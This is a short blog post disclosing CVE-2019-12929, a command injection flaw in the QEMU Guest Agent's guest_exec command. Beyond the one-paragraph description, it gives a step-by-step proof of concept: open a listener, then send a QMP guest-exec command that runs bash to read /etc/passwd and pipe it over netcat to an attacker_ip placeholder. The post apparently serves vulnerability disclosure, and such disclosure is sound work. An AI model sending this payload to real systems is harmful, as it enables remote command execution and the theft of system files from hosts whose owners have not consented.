---
layout: post
title: "[CVE-2019-12929] QEMU Guest Agent guest_exec Command Execution"
date: 2019-06-06
categories:
    - blog
keywords: "qemu, qemu-ga, guest_exec, command execution"
---

The QMP `guest_exec` command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.

1st, execute the QEMU Guest Agent service<br>
2nd, open another console and setup a listener to port 9999<br>
3rd, connect to the target and enter the following commands:

```
{'execute':'guest-exec','arguments':{'path':'/bin/bash','arg': ['-c', 'cat /etc/passwd | nc <attacker_ip> 9999']}}
```